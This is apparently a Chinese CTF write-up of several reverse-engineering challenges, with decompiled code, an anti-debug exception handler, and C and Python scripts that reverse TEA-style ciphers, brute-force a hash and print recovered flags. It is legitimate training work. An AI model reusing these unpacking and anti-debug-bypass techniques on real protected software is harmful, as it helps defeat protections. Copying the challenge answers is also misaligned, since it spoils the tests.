        enc[i] = (cipher[4 * i + 1] << 24) | (cipher[4 * i] << 16) | (cipher[4 * i + 3] << 8) | cipher[4 * i + 2];
    }
    
    unsigned int key[4] = { 305419896, 2427178479, 289739801, 427884820 };
    for (int i = 0; i < 4; i++) {
        key[i] ^= my_rand();
    }
    
    for (int j = 0; j < 6; j++) {
        unsigned int v7 = my_rand();
        decrypt_pair(&enc[2 * j], &enc[2 * j + 1], key, v7);
    }
    
    unsigned char flag[49];
    for (int i = 0; i < 12; i++) {
        flag[4 * i] = (enc[i] >> 8) & 0xFF;
        flag[4 * i + 1] = (enc[i] >> 24) & 0xFF;
        flag[4 * i + 2] = (enc[i] >> 16) & 0xFF;
        flag[4 * i + 3] = enc[i] & 0xFF;
    }
    flag[48] = '\0';
    printf("Flag: %s\n", flag);
    return 0;

}
```



## 尤皮·埃克斯历险记（3）

这题开始正常upx手脱，虽然看不见但是又看得见（），凭手感脱了
然后这里脱完我没有去继续运行导致忽略了一个重要的点qwq
然后就会发现很奇妙的点
一个函数里有这样诡异的语句

```
v123 = (1 - main(v121, v120, v122)) * v119;
```

而且这函数根本没用（），可是把这函数当不存在又解密不了
熬了一会去x64dbg里慢慢跟着走，爆异常了，结合题干知道这是重点了，但是不知道怎么修，然后在ida里无聊乱翻
看到

```
__int64 __fastcall sub_1400014C9(__int64 a1, int a2)
{
  int v2; // ebx
  int i; // [rsp+28h] [rbp-8h]
  unsigned int v5; // [rsp+2Ch] [rbp-4h]

  v5 = 114514;
  for ( i = 0; i < a2; ++i )
  {
    v2 = (v5 << 19) + 8 * *(unsigned __int8 *)(a1 + i) + 19 * v5;
    v5 = v2 + 10 * rand();
  }
  return v5;
}
```

交叉引用看到

```
__int64 __fastcall sub_1400021C5(struct _EXCEPTION_POINTERS *ExceptionInfo)
{
  __int64 R8; // [rsp+38h] [rbp-28h]
  __int64 Rdx; // [rsp+40h] [rbp-20h]
  __int64 Rcx; // [rsp+48h] [rbp-18h]
  PCONTEXT ContextRecord; // [rsp+50h] [rbp-10h]

  ContextRecord = ExceptionInfo->ContextRecord;
  if ( ExceptionInfo->ExceptionRecord->ExceptionCode != -1073741676 )
    return 0LL;
  if ( _InterlockedCompareExchange((volatile signed __int32 *)&qword_140008148, 1, 0) )
    return 0LL;
  Rcx = ContextRecord->Rcx;
  Rdx = ContextRecord->Rdx;
  R8 = ContextRecord->R8;
  if ( !Rcx || !Rdx || !R8 )
    return 0LL;
  sub_1400020C9(Rcx, Rdx, R8, ContextRecord->R9);
  if ( qword_140008150 )
    ContextRecord->Rip = qword_140008150;
  else
    ContextRecord->Rip += 2LL;
  return 0xFFFFFFFFLL;
}
```

感觉就很像异常处理函数，丢给机器智能，智能机器表示还真是，然后找生成种子，函数名称里就能找到，交叉引用

```
_BYTE *sub_1400022F8()
{
  _BYTE *result; // rax
  _BYTE *i; // [rsp+48h] [rbp-8h]

  result = (_BYTE *)NtCurrentTeb()->ProcessEnvironmentBlock->BeingDebugged;
  if ( !(_BYTE)result )
  {
    Handle = AddVectoredExceptionHandler(1u, (PVECTORED_EXCEPTION_HANDLER)sub_1400021C5);
    srand(0x93E71989);
    for ( i = sub_140001648; ; ++i )
    {
      result = (char *)sub_140001648 + 4092;
      if ( i >= (_BYTE *)sub_140001648 + 4092 )
        break;
      if ( *i == 65 && i[1] == 66 && i[2] == 67 && i[3] == 68 )
      {
        result = i + 4;
        qword_140008150 = (__int64)(i + 4);
        return result;
      }
    }
  }
  return result;
}
```

就都搞到了
然后加密函数是个哈希，所以要暴力

```
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

uint32_t cipher[16] = {
    0xE70F6EB4, 0xB7741AEE, 0x77B3F96C, 0x3A7D82E4,
    0x0DF89E70, 0x70C13CEC, 0x55602656, 0x94B4BC8A,
    0x43310CE4, 0x5F357476, 0xD724D53A, 0x6DE31BB0,
    0xE5210B0E, 0xA49BF77A, 0xCF381F00, 0x363ED066
};

static unsigned long rand_seed = 0;

void msvc_srand(unsigned int seed) {
    rand_seed = seed;
}

int msvc_rand() {
    rand_seed = rand_seed * 214013 + 2531011;
    return (rand_seed >> 16) & 0x7fff;
}

uint32_t hash_calc(uint8_t* data, int len, int* rand_arr, int rand_start) {
    uint32_t v5 = 114514;
    for (int i = 0; i < len; i++) {
        uint32_t v2 = (v5 << 19) + 8 * data[i] + 19 * v5;
        v5 = v2 + 10 * rand_arr[rand_start + i];
    }
    return v5;
}

int main() {
    msvc_srand(0x93E71989);
    int rand_arr[46];
    for (int i = 0; i < 46; i++) {
        rand_arr[i] = msvc_rand();
    }

    uint8_t flag[47] = { 0 }; 
    for (int group = 0; group < 16; group++) {
        int len = (group <= 15) ? 3 : 1;
        int rand_start = 3 * group;
        uint32_t target = cipher[group];
        int found_group = 0;

        uint32_t start = 0;
        uint32_t end = (group <= 15) ? 0xFFFFFF : 0xFF;
        for (uint32_t candidate = start; candidate <= end; candidate++) {
            uint8_t data[3] = { 0 };
            if (group <= 15) {
                data[0] = candidate & 0xFF;
                data[1] = (candidate >> 8) & 0xFF;
                data[2] = (candidate >> 16) & 0xFF;
            }
            else {
                data[0] = candidate & 0xFF;
            }

            uint32_t hash_val = hash_calc(data, len, rand_arr, rand_start);
            if (hash_val == target) {
                printf("Group %d found: ", group);
                if (group <= 15) {
                    printf("%c%c%c\n", data[0], data[1], data[2]);
                    memcpy(flag + group * 3, data, 3);
                }
                else {
                    printf("%c\n", data[0]);
                    flag[45] = data[0];
                }
                found_group = 1;
                break;
            }
        }
        if (!found_group) {
            printf("Group %d not found!\n", group);
            return -1;
        }
    }

    flag[46] = 0;
    printf("Flag: %s\n", flag);
    return 0;
}


题外话
Group 0 found: fla
Group 1 found : g{C
Group 2 found: 4tc
Group 3 found : H_t
Group 4 found : h3_
Group 5 found : rUn
Group 6 found : 71m
Group 7 found : 3_3
Group 8 found : rr0
Group 9 found : R_0
Group 10 found : f_d
Group 11 found : 1vI
Group 12 found : d3D
Group 13 found : _8Y
Group 14 found : _z3
Group 15 not found!

15我直接看着前面猜出来这里是zero变形了就不修了
```



## NOT_TUI

额感谢签到喵~，题目名称是不要推，嗯，所以不要推，经过简单分析后得到解密脚本

```
#include <stdio.h>
#include <stdint.h>
#include <string.h>

// S盒（256字节）
const uint8_t s_box[256] = {
    0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
    0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,
    0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,
    0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,
    0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,
    0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,
    0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,
    0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,
    0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,
    0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,
    0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,
    0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,
    0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,
    0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,
    0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,
    0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16
};

// 完整的目标加密数据（8个DWORD = 32字节）
const uint32_t encrypted_data[8] = {
    0x5AF4429C, 0xBAA6B51B, 0x5CDECA1F, 0xAF439534,
    0x8B07D489, 0xCC2048AF, 0x957F02B6, 0x9C4988FD
};

// 构建逆S盒
void build_inverse_sbox(const uint8_t* sbox, uint8_t* inv_sbox) {
    for (int i = 0; i < 256; i++) {
        inv_sbox[sbox[i]] = i;
    }
}

// TEA-like解密函数
void tea_decrypt(uint32_t* v) {
    uint32_t v0 = v[0];
    uint32_t v1 = v[1];
    uint32_t delta = 1131796;
    uint32_t sum = delta * 0x72; // 总轮数0x72

    const char* key0 = "String_Theocracy";
    const char* key1 = "Paper_Bouquet_Mili";
    const uint32_t* k0 = (const uint32_t*)key0;
    const uint32_t* k1 = (const uint32_t*)key1;
    
    // 逆向加密轮次
    for (int i = 0x71; i >= 0; i--) {
        if (i & 1) {
            // 奇数轮使用key1
            v1 -= ((v0 << 4) + k1[2]) ^ (v0 + sum) ^ ((v0 >> 5) + k1[3]);
            v0 -= ((v1 << 4) + k1[0]) ^ (v1 + sum) ^ ((v1 >> 5) + k1[1]);
        }
        else {
            // 偶数轮使用key0
            v1 -= ((v0 << 4) + k0[2]) ^ (v0 + sum) ^ ((v0 >> 5) + k0[3]);
            v0 -= ((v1 << 4) + k0[0]) ^ (v1 + sum) ^ ((v1 >> 5) + k0[1]);
        }
        sum -= delta;
    }
    
    v[0] = v0;
    v[1] = v1;

}

int main() {
    uint8_t inv_sbox[256];
    build_inverse_sbox(s_box, inv_sbox);

    // 创建32字节缓冲区（实际数据部分）
    uint8_t buffer[32];
    
    // 将目标数据复制到缓冲区（注意字节序）
    memcpy(buffer, encrypted_data, 32);
    
    printf("Target encrypted data:\n");
    for (int i = 0; i < 8; i++) {
        printf("  [%d]: 0x%08X\n", i, ((uint32_t*)buffer)[i]);
    }
    printf("\n");
    
    // 第一步：逆向TEA解密
    // 加密时处理了7对块：0-1, 1-2, 2-3, 3-4, 4-5, 5-6, 6-7
    // 解密时需要逆向处理：6-7, 5-6, 4-5, 3-4, 2-3, 1-2, 0-1
    for (int j = 6; j >= 0; j--) {
        tea_decrypt((uint32_t*)&buffer[4 * j]);
        printf("After decrypting blocks %d-%d:\n", j, j + 1);
        for (int k = 0; k < 8; k++) {
            printf("  [%d]: 0x%08X\n", k, ((uint32_t*)buffer)[k]);
        }
        printf("\n");
    }
    
    // 第二步：逆向字节替换
    for (int i = 0; i < 32; i++) {
        buffer[i] = inv_sbox[buffer[i]];
    }
    
    // 输出解密结果
    printf("Final decrypted flag content: ");
    for (int i = 0; i < 32; i++) {
        printf("%c", buffer[i]);
    }
    printf("\n\n");
    
    printf("Full flag: flag{");
    for (int i = 0; i < 32; i++) {
        printf("%c", buffer[i]);
    }
    printf("}\n\n");
    
    printf("Hex dump: ");
    for (int i = 0; i < 32; i++) {
        printf("%02X ", buffer[i]);
    }
    printf("\n");
    
    return 0;

}
```



## PleaseHookMe

比较悲伤的一点是没有root真机，开始一直hook不了不知道为什么，看到了一篇文章说是arm问题，解决方案询问出题人哥哥后得到的回复是不行，那只能静态分析了（悲）

问了一下可以模拟那两个函数的python脚本直接爽用

```
import numpy as np
def vqtbl1q_s8(a, b):
    res = []
    for i in b:
        if i < len(a):
            res.append(a[i])
        else:
            res.append(0)
    return np.array(res, dtype=np.uint8)
def veorq_s8(a, b):
    return np.bitwise_xor(a, b)
t = np.array([0x0D, 0x0E, 0x0F, 0x0C, 0x0B, 0x0A, 0x09, 0x08, 0x06, 0x07, 0x05, 0x04, 0x02, 0x03, 0x01, 0x00],dtype=np.uint8)
l = np.array([0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7, 0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF],dtype=np.uint8)
xmmword_720 = np.array([0x88, 0xCF, 0x93, 0x9B, 0x88, 0x90, 0x93, 0x9B,0x88, 0xCF, 0x9A, 0x92, 0x88, 0xB0, 0x9A, 0x92], dtype=np.uint8)

v13 = veorq_s8(l, t)

v = xmmword_720.copy()
for _ in range(12):
    v = veorq_s8(vqtbl1q_s8(v, t), v13)
    v = veorq_s8(v, t)
    v = veorq_s8(vqtbl1q_s8(v, t), v13)

v20 = veorq_s8(vqtbl1q_s8(v, t), v13)
print("v20 =", ','.join(f'0x{b:02X}' for b in v20))
```

密钥就是喵喵喵喵了

```
 Meowme0wmeowme0w
```

密钥弄到了就各显神通了

```
def F(B, D, v10, K_val):
    term1 = ((4 * B) & 0xFFFFFFFF) ^ (D >> 5)
    term2 = ((16 * B) & 0xFFFFFFFF) ^ (D >> 3)
    sum1 = (term1 + term2) & 0xFFFFFFFF
    term3 = (K_val ^ D)
    term4 = (B ^ v10)
    sum2 = (term3 + term4) & 0xFFFFFFFF
    return (sum1 ^ sum2) & 0xFFFFFFFF


def G(C, A, v10, K_val):
    term1 = ((4 * C) & 0xFFFFFFFF) ^ (A >> 5)
    term2 = ((16 * C) & 0xFFFFFFFF) ^ (A >> 3)
    sum1 = (term1 + term2) & 0xFFFFFFFF
    term3 = (K_val ^ A)
    term4 = (C ^ v10)
    sum2 = (term3 + term4) & 0xFFFFFFFF
    return (sum1 ^ sum2) & 0xFFFFFFFF


def H(D, B, v10, K_val):
    term1 = ((4 * D) & 0xFFFFFFFF) ^ (B >> 5)
    term2 = ((16 * D) & 0xFFFFFFFF) ^ (B >> 3)
    sum1 = (term1 + term2) & 0xFFFFFFFF
    term3 = (K_val ^ B)
    term4 = (D ^ v10)
    sum2 = (term3 + term4) & 0xFFFFFFFF
    return (sum1 ^ sum2) & 0xFFFFFFFF


def I(A, C, v10, K_val):
    term1 = ((4 * A) & 0xFFFFFFFF) ^ (C >> 5)
    term2 = ((16 * A) & 0xFFFFFFFF) ^ (C >> 3)
    sum1 = (term1 + term2) & 0xFFFFFFFF
    term3 = (K_val ^ C)
    term4 = (A ^ v10)
    sum2 = (term3 + term4) & 0xFFFFFFFF
    return (sum1 ^ sum2) & 0xFFFFFFFF

v20_str = "Meowme0wmeowme0w"
v20_bytes = [ord(c) for c in v20_str]

K0 = v20_bytes[0] | (v20_bytes[1] << 8) | (v20_bytes[2] << 16) | (v20_bytes[3] << 24)
K1 = v20_bytes[4] | (v20_bytes[5] << 8) | (v20_bytes[6] << 16) | (v20_bytes[7] << 24)
K2 = v20_bytes[8] | (v20_bytes[9] << 8) | (v20_bytes[10] << 16) | (v20_bytes[11] << 24)
K3 = v20_bytes[12] | (v20_bytes[13] << 8) | (v20_bytes[14] << 16) | (v20_bytes[15] << 24)
K = [K0, K1, K2, K3]

delta = 0x9E3779B9  
n = 214
A = 0x583F7D05
B = 0xC4E83E36
C = 0x481C5AAA
D = 0xA12F85E6
v10 = (0x9E3779B9 + 213 * delta) & 0xFFFFFFFF  # 初始v10值

for i in range(n):
    v16 = (v10 >> 2) & 3
    I_val = I(A, C, v10, K[(v16 ^ 3) & 3])
    D = (D - I_val) & 0xFFFFFFFF
    H_val = H(D, B, v10, K[(v16 ^ 2) & 3])
    C = (C - H_val) & 0xFFFFFFFF
    G_val = G(C, A, v10, K[(v16 ^ 1) & 3])
    B = (B - G_val) & 0xFFFFFFFF
    F_val = F(B, D, v10, K[v16])
    A = (A - F_val) & 0xFFFFFFFF
    v10 = (v10 - delta) & 0xFFFFFFFF

def int_to_bytes_le(i):
    return [i & 0xFF, (i >> 8) & 0xFF, (i >> 16) & 0xFF, (i >> 24) & 0xFF]


bytes_A = int_to_bytes_le(A)
bytes_B = int_to_bytes_le(B)
bytes_C = int_to_bytes_le(C)
bytes_D = int_to_bytes_le(D)
bytes_all = bytes_A + bytes_B + bytes_C + bytes_D
flag = ''.join(chr(b) for b in bytes_all)
print("Flag:", flag)
```

## Not Symmetric 【挑战】

其实出题人有提示但是我读不懂英文qwq

```
DonTry_To_Brute_Time          我们都知道，不要就是要
```

这题可读性还是很高的，看到rand我们依旧，但是找不到种子

自己测试一下这个程序，发现对于相同的数据加密得到的diff_list一样，但是prime_list不一样，说明额，说明要暴力
v13 = rand() % 65;   仔细一看发现这才65种，干了，知道这个其实已经可以大显神通了，但是为了防止被大调查我们还是理解一下（

这题大概就是把输入转成数字，然后去往后面找素数，因为v13 偏移不同所以会影响prime_list，diff_list单纯是分组然后得到找第一个素数相对的偏移，所以解密就枚举v13然后反向找打印出来是可读内容的东西，

```
import gmpy2
from Crypto.Util.number import long_to_bytes
import string

# 加密输出数据
diff_list = [6, 2, 8, 11, 30, 2, 8, 6, 15, 2, 14, 19, 9, 14, 14, 18, 20, 14, 6, 20]
prime_list = [
    429285974737739014803551447292506619341644422417795748844444589156834323209752809967182875092215675255508194100273849143473700686603622223151574901510713980915322189169224136986682797754371436102072091099883719928467763771991114373413558187002461581735526592177950021502312216747522966097177429408632418247597421601218910504319613137258666012407197089280628546417510165124751693382608829,
    515441798243178893397339332638777948772636972065385182532727818568515669701887723255663020426008098540691792202067088433140253048020685109674408054770550416886715328686576433002749043979408815315137293309329179467948368161904239809817117402565992591179360007287508175098468100887056355881827170814802071150147091273442818958645771776947878111212572210321852875586212464590158159882805792437360130172004624119207558151,
    55858263202755338173073591152252394172947480160558724269836569715083181789893055942826874739956625655687640916694171773217548677429227213122819335121006949735354107972650963159072590258676958324250065332460702752320107257938763829729145039348736947338016719263435173543569247135987370332288668198694671043813718270375236952216217166895329262052323786412060178004105611480701501458469848876515167866612611681220041393698177,
    487061693788362596761627472016673018286161535374020746649159129435559778697553541939766746358107757915579027464505683424079732706472982787066112547242672175763886772081909960928959932665115532299005925636005240674497949794087691005733623722410953900239392929505417250170818017399300489736894808991068321113281743571758039267314148414165043795004854781215038629588766275571792229787772788962645779985822388069221775665860852955902578690215777768821167773004590507341199121094824502554224224578833395043,
    1925581607490500598062113629349654693407000301930286900703338181605034984412356234416215943610324179303943535826312554386023686212923630658453838640194833451390013788874648426375781018592374941568622262360808753899134570572853725802815678644779235218357807278426708989257606426319471935076614331540218827560259176470372562289099421025176367273404004613043987414684020795972724533957028446703746763785986098533178098319761643008452689499515587055202812016090303479436606455862315829307026892537383347003172209,
    202517237228876670302343962581542457154585507153191698008953772301755384214392044403843961125300306871766964711517623022419424337767154652407143955680535890597833299009293060182811992632351054054489685688627347097233962042847962510190136656014528480358972659787316213024644092001513164839461583401515530394592024779733016972373957067928805450028746109267476091151161391624720263213647711697282926775198039481376666390379676418489897074958444749141901691189643268718131230352387816337208872131021046406790210401649,
    2729403297814648425007950343334224416614663719240215776718887179322661524508681998164539855917831955862992238274259311728078229194417434175183129531830287924859187159512313461319422774972494302413721614769783848458275059417778101511566305132520486602695979487442746996034677536206480810262500035151162467428899393789171231970019763468895743115194777817017651443043020580864900465411307,
    887109274494023332059521514024494855104702776835991777270266595076004658950733255904470583054979254795209824110268631864535598231491169967200834561750141871717517066588629890113822737551959500949771069425362725633264105145194441314363576520807357769865818514086867716109533523873460683656265675060809420795811638170088910687771866809055273427577058419531249005266652165710676059395007205797243514869868454006727203770512823476595031643323484901,
    375959438987496467620846314064398353234939723320639974753290531759179705849997513805913067075155444338415575881821007371157155375423303584217800227946786187785322060166113356023602793321667741216382679591261352585028476318910208938453855048525326428523898490117676959700664145987072882101433043240924564081369993802386009404381176550902525822577647098667349054517262519235035256226146497271768896595751552433309737106139107657105896035561161521560919393753997014819274493409760262295669193,
    684316804779371779450424814335156738050926598534030500791760808550466201363227656073832924206919612746272581670136950186799386281317791867304109575092237324121286399300889602573262182341584644236979341639330088636047761586313516744018954328960316719610527659572739073209194259169692159065876725859635622241660573643466286050655694620687636135380986198004428779503125979347175850543907813928572213408492379240828395061975443088981523408228558275692077859951644851625100803625818615075334010710534138137493,
    199633088480986757467777221141880427795447098139453333466310391294624527313663608281425957956261746680805362692743613516823347167539902692238598918851573211372833423592958751420220264968526478432224996848519223543320790952913816545748545026772632425173190903429898534928538035500204137455568785182174594233210488326148420060790602724341071714362824978771544670098489919007684256515392858543381758845595740771775168450934402471145578939905336389896254968842735723532629,
    1677259497058162898516955377096053495965259224635080619736648904819661301200085496033593796727486553974540151277096871628900860629392933294550159105948093716350709563924712723625601881982245277711890698835242816502356588310240735661137124751943115341177219758491538283245004184934118680943299255863365806197040695086300157595537288515124670472688759924178045994606412930044504484524467686350526110157538629191650571923217575055817195061430821951385193303168729912481812118886037036086341,
    416193800025334875854058058353233779876937962425638314542002431271764795656326902199288421974967249684613737357409772432032849377490093028877459708205301346692401689902169546503668512662144878251128464487532450418047110819369603339679218252623479898939059803233278441243821386841789805624297447860696140666567859786777102234587195822746781082307348432662916347407618575546277539471276535304190754749558211784742213936266587804276929972907641837930944610740118987972471906639306966833958365874448903499143052111,
    15411211672738031204171342813796904866607270885976764287858073619524380380523908467184285806712206002483889440764968451341437152791129416847261523386397507603599504769584799000328977346241544065299467529129992021880897702653285596764097380020031465720695403171404557251485127758340150775985454409790861565576437221429494161315262840046251470385411829377129992019719005836779920370989884783165214987439427382512561686154002769506396604135172330765504244447933719548872391712014012710546384103884633723,
    11936245074277425578137991792109014076574937767181294873632291896025409774467783807721710425193033545508877740948079268247425666305051369176436815977692065814010400333860039790596466560031848408595003250892685218443412412870907874728052834559643849974106936181129974194563660156131748845480996863795205890894768759472954280515376144893807898345142660529824975281710100624413056293898269929277284406825748725033088990513642126855338715289823559192696726957614051840060295255689806154693890393581326462814382950785098028970996290209222070766226381676932071947521,
    1105742399166173837059801261291878243547885635957271079492086984504629205991480265150066567895525293464889698672788676708850949281493394642673800629248269913782964584301627445252584918087486426923087393092157506677328102767275832567137548120197320046057544927671736026000381054155084548075503975296508989635303527068675477163102121772418225838328026517190215535440056383387367882956558990441066911699075370572314051957485141084524733989165457743224005533923547360039913632770011296163377,
    105093759279567806611150321312440598523584464966308943730307717107502542483284391884127879478222735963104415499430561306943253035782255503237759011033847907275538260684402162220848223751705316186310180945375880191426241455309727127201034392894232078332341799716022949241467853585115123247371577460725697002932681017926802597515982886455284428704168236771280194869815971780745684385978493403293873152250604746900905683957166568795597454842074534142936985139242599630416551843307581331458363689699553787612614850554447503780435912633406575059781807507591621143704742400141,
    945762738803595617695137410587107409128701036700694025900930497237334506674763764555376434314149031527093213293136341584711524885538204744772652936119656491595823960548829334637617201943139559490942326624845188723511558958216404707918364619960752708761558202690912065456495710089950179367336254473235681883468624689475576602891783825780413183581454598538474669975297803396391143981680078640569222730638287802919137884505005814767590854698553673189968656400015701737406437182714536952826935019133747651561708705163342773921033704582404071,
    10577093787303284052683287609638390661712170293752898987577641213201284363679229416212729475842234791900406376879146963595900605606540576333458877073101829901001036532129213277211264240846358581624039002001473956657521348186419099256575653236568409289380029449031097377381302878857574509807212944630163769755929928101173053348868834786874957696913861069112053439810414261397295422310900842123824516146482048518365887300130455997923694612992768385707249991741883387298319425716355006395131,
    52334397010128041406510129731025799322159387241435732653997537428958779784557313874574936575432994256084851942262847801025938284286753038952363088489179679582161282788808208855289806009376642056044630365253687166283732866322845675633354839738415946571141798769011533356827665040733532433008695401055199657789074736485410856886662568330068373828731870365850700084565257481707286641123295970766089793927099464729814972331892023427821194183619549338810720477606403751572116606367
]

v31 = "DonTry_To_Brute_Time"


def reverse_kmpc(final_prime, key):
    """反向计算KMPC函数，从最终素数还原初始素数"""
    current = final_prime

    # 反向迭代key次
    for _ in range(key):
        # 寻找乘数m，使得 (current-1)/m 是素数
        m = 1
        found = False
        while m <= 1000000:  # 安全限制
            if (current - 1) % m == 0:
                candidate = (current - 1) // m
                if gmpy2.is_prime(candidate):
                    current = candidate
                    found = True
                    break
            m += 1

        if not found:
            return None

    return current


def is_printable_bytes(data):
    """检查字节数据是否可打印"""
    try:
        text = data.decode('utf-8', errors='ignore')
        return all(c in string.printable for c in text)
    except:
        return False


def try_decrypt_block(block_idx, diff, final_prime):
    """尝试解密单个块"""
    base_key = (ord(v31[block_idx % 20]) ^ 0xCC) + block_idx
    candidates = []

    # 尝试所有可能的v13值
    for v13 in range(65):
        key = base_key + v13

        # 跳过无效的key
        if key <= 0:
            continue

        # 反向计算初始素数
        initial_prime = reverse_kmpc(final_prime, key)

        if initial_prime is None:
            continue

        # 计算原始值
        original_value = initial_prime - diff

        # 检查值是否在合理范围内（4字节）
        if 0 <= original_value < 2 ** 32:
            # 转换为字节
            try:
                bytes_data = long_to_bytes(original_value)
                # 确保是4字节，不足则填充
                while len(bytes_data) < 4:
                    bytes_data = b'\x00' + bytes_data

                # 检查是否包含可打印字符
                if is_printable_bytes(bytes_data):
                    candidates.append((bytes_data, v13))
            except:
                continue

    return candidates


def main():
    print("开始暴力破解...")
    print(f"共有 {len(diff_list)} 个块需要解密")

    all_candidates = []

    # 解密每个块
    for i, (diff, final_prime) in enumerate(zip(diff_list, prime_list)):
        print(f"破解块 {i}...")

        candidates = try_decrypt_block(i, diff, final_prime)

        if candidates:
            all_candidates.append(candidates)
            print(f"块 {i} 找到 {len(candidates)} 个候选:")
            for j, (data, v13) in enumerate(candidates):
                try:
                    text = data.decode('utf-8', errors='ignore').replace('\x00', '')
                    print(f"  候选 {j}: v13={v13}, 数据='{text}' (原始字节: {data.hex()})")
                except:
                    print(f"  候选 {j}: v13={v13}, 数据={data.hex()}")
        else:
            print(f"块 {i} 解密失败")
            all_candidates.append([])

    # 尝试组合所有块
    print("\n尝试组合所有块...")

    # 选择每个块的第一个候选（通常第一个就是正确的）
    selected_blocks = []
    selected_v13 = []

    for i, candidates in enumerate(all_candidates):
        if candidates:
            selected_blocks.append(candidates[0][0])
            selected_v13.append(candidates[0][1])
        else:
            print(f"警告: 块 {i} 没有候选，使用空数据")
            selected_blocks.append(b'\x00\x00\x00\x00')
            selected_v13.append(None)

    # 组合所有块
    full_message = b''.join(selected_blocks)

    # 移除可能的填充
    try:
        # 尝试解码为字符串
        message = full_message.decode('utf-8').rstrip('\x00')
        print(f"\n解密成功!")
        print(f"原始消息: {message}")
        print(f"使用的v13值: {selected_v13}")
        print(f"完整字节: {full_message.hex()}")
    except Exception as e:
        print(f"\n解码遇到问题: {e}")
        print(f"原始数据: {full_message.hex()}")
        print(f"使用的v13值: {selected_v13}")

        # 尝试其他编码
        try:
            message = full_message.decode('latin-1').rstrip('\x00')
            print(f"Latin-1 解码: {message}")
        except:
            print("Latin-1 解码也失败")


if __name__ == "__main__":
    main()
```



## AnEasySystem


解密脚本

网上找工具反出来然后辅助分析解出来就行（有的没的都丢过去就行（因为出题人善良没有反制**，赞美出题人），就是有点慢，可能等待过程中容易产生怀疑然后自己停掉（是我了））

```
import hashlib

# Standard AES S-box and inverse S-box
s_box = [
    0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
    0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,
    0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,
    0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,
    0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,
    0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,
    0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,
    0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,
    0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,
    0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,
    0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,
